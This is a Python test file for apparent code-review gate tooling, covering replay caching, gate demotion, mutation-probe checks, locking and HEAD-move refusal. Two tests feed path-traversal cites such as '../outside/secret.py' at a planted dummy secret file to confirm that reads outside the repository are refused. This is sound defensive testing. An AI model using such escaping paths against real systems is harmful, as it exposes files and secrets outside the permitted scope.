    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q")
    for n in range(3):
        (repo / "a.md").write_text(f"{n}\n")
        _git(repo, "add", "a.md")
        _git(repo, "commit", "-qm", f"feat: step {n} (#{n + 1})")
    monkeypatch.setattr(core, "WINDOW", 2)
    monkeypatch.setattr(fr, "GATE_LOG_JSONL", tmp_path / "gate.jsonl")
    return repo


def test_replay_measures_each_arc_once(tmp_path, monkeypatch):
    repo = _replay_repo(tmp_path, monkeypatch)
    check = Counting("stale_carry")

    def run() -> core.ReplayVerdict:
        return runner.replay(repo, check, lane_id="lane-a", ref="HEAD", pr_body=lambda r, ref: None)

    assert run() == run() == core.Measured((False, False))
    assert check.seen == [("a.md",), ("a.md",)]  # two arcs, each measured by the first replay only
    monkeypatch.setattr(runner, "implementation_digest", lambda: "changed-checker")
    assert run() == core.Measured((False, False))
    assert len(check.seen) == 4  # a changed implementation re-measures every arc


def test_replay_remeasures_an_arc_whose_pr_body_changed(tmp_path, monkeypatch):
    repo = _replay_repo(tmp_path, monkeypatch)
    check = Counting("stale_carry")
    bodies: dict[str, str | None] = {"2": None, "3": None}  # gh could not fetch either body

    def run() -> core.ReplayVerdict:
        return runner.replay(
            repo, check, lane_id="lane-a", ref="HEAD", pr_body=lambda r, ref: bodies[ref]
        )

    run()
    run()
    assert len(check.seen) == 2  # an unchanged body reuses the measurement
    bodies["3"] = "Ran: `just lint`\n"  # gh recovers for #3 only
    run()
    assert len(check.seen) == 3  # #3 re-measured against the body it now has; #2 reused


def test_replay_refuses_a_check_that_executes_subject_tests(tmp_path):
    with pytest.raises(runner.ReplayError, match="executes subject tests"):
        runner.replay(tmp_path, mpr.Check(), lane_id="lane-a", pr_body=lambda r, ref: None)


def test_runner_demotion_verbs_detect_then_record_a_due_demotion(tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(core, "STATE_PATH", tmp_path / "state.json")
    log = tmp_path / "gate.jsonl"
    monkeypatch.setattr(fr, "GATE_LOG_JSONL", log)
    core.save_state({"stale_carry": core.Blocking(PROMOTED)})
    rows = [_row(a, "no_finding") for a in range(40)]
    rows += [_row(a, "finding", n=2) for a in (1, 2, 21, 22)]
    rows += [_row(a, "finding_adjudication", n=2, disposition="rejected") for a in (1, 2, 21, 22)]
    log.write_text("".join(json.dumps(r) + "\n" for r in rows))

    assert runner.main(["demotion-due"]) == 1
    assert "DEMOTION DUE stale_carry: windows [2, 2]" in capsys.readouterr().out
    assert runner.main(["demote"]) == 0
    assert isinstance(core.load_state()["stale_carry"], core.Advisory)
    assert fr.read_rows(log)[-1]["record_kind"] == "gate_demotion"
    assert runner.main(["demotion-due"]) == 0


# --- codex round 11 absorptions (u-he-40) ------------------------------------------------
# Each test below is the witness for one r11 P2. The `# mutation-probe:` line above each names
# the edit that must turn it red, so the witness is deletion-expressible rather than decorative.


# mutation-probe: tools/mechanized_checks/core.py:88-89 drop the `is_relative_to` containment arm
def test_subject_read_refuses_a_path_that_escapes_the_subject_root(tmp_path):
    """r11 P2: `rel` comes from CHANGED MARKDOWN, so a `..` cite must never let a
    repo-scoped check read -- or validate a citation against -- a file outside the tree."""
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.py").write_text("TOKEN = 1\n")
    repo = tmp_path / "repo"
    (repo / "tools").mkdir(parents=True)
    (repo / "tools" / "x.py").write_text("A = 1\n")

    subject = _subject(repo)
    assert subject.read("tools/x.py") == "A = 1\n"  # in-subject reads are unaffected
    assert subject.read("../outside/secret.py") is None
    assert subject.read("tools/../../outside/secret.py") is None


# mutation-probe: tools/mechanized_checks/core.py:88-89 drop the `is_relative_to` containment arm
def test_an_escaping_cite_is_reported_not_silently_validated(tmp_path):
    """The end-to-end half of the containment fix: the escaping cite resolves to nothing,
    so it surfaces as a finding instead of passing on the outside file's line count."""
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.py").write_text("TOKEN = 1\n")
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "d.md").write_text("see `../outside/secret.py:1`\n")

    found = cited_symbol_exists.Check().run(_subject(repo, changed=["d.md"]))
    assert [f.location for f in found] == ["../outside/secret.py:1"]


# mutation-probe: tools/mechanized_checks/cited_symbol_exists.py:23 make _resolves bound only end
def test_cited_range_validates_start_and_end_independently(tmp_path):
    """r11 P2: bounding only `end` passed `tools/x.py:999-1` against any one-line file,
    because a reversed range puts the smaller number where the bound is read."""
    (tmp_path / "tools").mkdir()
    (tmp_path / "tools" / "x.py").write_text("only = 1\n")  # exactly one line
    (tmp_path / "r.md").write_text(
        "reversed `tools/x.py:999-1`, zero `tools/x.py:0`, whole `tools/x.py:1-1`\n"
    )
    found = {
        f.location for f in cited_symbol_exists.Check().run(_subject(tmp_path, changed=["r.md"]))
    }
    assert found == {"tools/x.py:999-1", "tools/x.py:0"}  # the in-range cite stays clean


# mutation-probe: tools/mechanized_checks/mutation_probe_reverify.py:171 drop the changed-target arm
def test_mutation_probe_reverify_sees_a_changed_target_under_an_unchanged_test(tmp_path):
    """r11 P2: the asymmetric case. A probed SOURCE file changes while its annotated test
    does not, so the pin's target digest goes stale -- scanning only CHANGED test files left
    that stale pin uninspected and let a blocking gate pass."""
    _probe_fixture(tmp_path, logged=True)
    (tmp_path / "tools" / "x.py").write_text("A = 1\nB = 3\n")  # the probed target moves

    # the test file itself is NOT in `changed`; only its target is
    subject = _subject(tmp_path, changed=["tools/x.py"])
    found = mpr.Check(probe=lambda *_a: (1, "")).run(subject)
    assert [f.location for f in found] == ["tools/test_x.py::test_t"]
    assert "no longer pins the current bytes" in found[0].evidence


# mutation-probe: tools/mechanized_checks/core.py:249 drop record_lock's flock acquisition
def test_record_lock_is_exclusive_and_times_out_loudly(tmp_path, monkeypatch):
    """r11 P2: replay's select-then-emit is one operation. The lock that makes it one must
    actually exclude a second holder, and say so rather than silently proceeding."""
    monkeypatch.setattr(fr, "GATE_LOG_JSONL", tmp_path / "g.jsonl")
    monkeypatch.setattr(fr, "LOCK_TIMEOUT_S", 0.3)
    with core.record_lock():
        with pytest.raises(Exception) as caught:
            with core.record_lock():
                pass
    assert "lock" in str(caught.value).lower()


# mutation-probe: tools/mechanized_checks/runner.py:291-297 drop the moved-HEAD refusal
def test_mech_check_refuses_when_head_moves_while_gathering_the_subject(tmp_path, monkeypatch, capsys):
    """r11 P2: HEAD is read before the subject runs its own git queries. A commit landing
    between them would stamp findings from the NEWER diff with the older sha, so the run
    refuses rather than emitting a mislabelled row."""
    heads = iter(["a" * 40, "b" * 40])  # HEAD moves between the two rev-parse calls
    monkeypatch.setattr(runner, "_git", lambda *_a, **_k: next(heads) + "\n")
    monkeypatch.setattr(runner, "working_tree_subject", lambda *_a, **_k: _subject(tmp_path))
    monkeypatch.setattr(runner.core, "load_state", lambda: {})
    emitted: list[object] = []
    monkeypatch.setattr(runner, "run_checks", lambda *a, **k: emitted.append(a) or 0)

    assert runner.main(["check"]) == 2
    assert emitted == []  # nothing was gathered under the stale sha
    assert "HEAD moved" in capsys.readouterr().err
